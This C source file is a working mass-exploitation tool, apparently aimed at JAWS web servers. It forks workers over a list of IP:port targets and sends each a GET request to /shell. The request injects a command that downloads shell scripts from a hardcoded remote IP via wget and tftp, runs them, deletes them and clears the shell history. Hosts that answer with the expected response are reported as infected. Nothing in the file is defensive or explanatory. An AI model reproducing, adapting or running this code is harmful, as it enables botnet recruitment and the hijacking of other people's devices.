//by Sinden
#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/wait.h>

#define INFO "[\x1b[33m?\x1b[37m]"
#define SUCCESS "[\x1b[32m+\x1b[37m]"
#define ERROR "[\x1b[31m-\x1b[37m]"
#define ARRAY_SIZE(Array) sizeof(Array) / sizeof(Array[0])

const char *Payload = "cd /tmp; wget http://167.88.114.40/w.sh;chmod 777 w.sh;sh w.sh;tftp 167.88.114.40 -c get t.sh;chmod 777 t.sh;sh t.sh;rm -rf w.sh t.sh;history -c";
const char *Success = "listening tun0";

const char *UserAgents[] = {
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A"
	"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16"
};

void InfectJAWS(const char* IP, int Port, int Timeout)
{
	int Socket = -1;
	char Vulnerable = 0;
	struct sockaddr_in addr;

	struct timeval tv;
	tv.tv_sec = Timeout;
	tv.tv_usec = 0;

	char Headers[1024];
	snprintf(Headers, sizeof(Headers), "GET /shell?%s HTTP/1.1\r\nUser-Agent: %s\r\nHost: %s:%d\r\n" \
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nConnection: keep-alive\r\n\r\n",
		Payload, UserAgents[(rand() % ARRAY_SIZE(UserAgents))], IP, Port);

	if ((Socket = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		return;

	if (setsockopt(Socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(struct timeval)) == -1)
	{
		close(Socket);
		return;
	}

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(IP);
	addr.sin_port = htons(Port);

	if (connect(Socket, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
	{
		close(Socket);
		return;
	}

	int Read;
	char Recieve[BUFSIZ];

	if (write(Socket, Headers, strlen(Headers)) >= 0)
	{
		while ((Read = read(Socket, Recieve, sizeof(Recieve))) > 0) 
		{
			Recieve[Read] = '\0';
			if (strstr(Recieve, Success) != NULL)
			{
				Vulnerable = 1;
				break;
			}
		}
	}

	close(Socket);

	if (Vulnerable)
		printf("%s Infected %s:%d\n", SUCCESS, IP, Port);
}

char *Trim(char *str)
{
	int i, Begin = 0;
	int End = strlen(str) - 1;

	while (isspace(str[Begin]))
		Begin++;
	while ((End >= Begin) && isspace(str[End]))
		End--;
	for (i = Begin; i <= End; i++)
		str[i - Begin] = str[i];

	str[i - Begin] = '\0';
}

int main(int argc, char const *argv[])
{
	if (argc != 4)
	{
		printf("%s Usage: %s <max forks> <ip:port list> <timeout (in seconds)>\n", INFO, argv[0]);
		return 1;
	}

	int i, Forks = 0;
	char Buffer[513];
	int MaxForks = atoi(argv[1]);
	int Timeout = atoi(argv[3]);
	FILE *IPs = fopen(argv[2], "r");

	if (IPs == NULL)
	{
		printf("%s Failed to open \"%s\"\n", ERROR, argv[1]);
		return 1;
	}

	printf("%s Running with %d max forks against \"%s\" with a timeout of %d %s\n\n", INFO, MaxForks, argv[2], Timeout, (Timeout > 1 ? "seconds" : "second"));

	while (fgets(Buffer, sizeof(Buffer) - 1, IPs))
	{
		Trim(Buffer);
		if (strlen(Buffer) < 3)
			break;

		char *Token = strtok(Buffer, ":");
		for (i = 0; i < strlen(Buffer) && Buffer[i] != ':'; i++);

		const char *IP = Buffer;
		int Port = atoi(Buffer + i + 1);
		
		if (!(fork()))
		{
			InfectJAWS(IP, Port, Timeout);
			exit(0);
		}
		else
		{
			Forks++;
			if (Forks++ > MaxForks)
				for (Forks; Forks > MaxForks; Forks--)
					wait(NULL);
		}
	}

	return 0;
}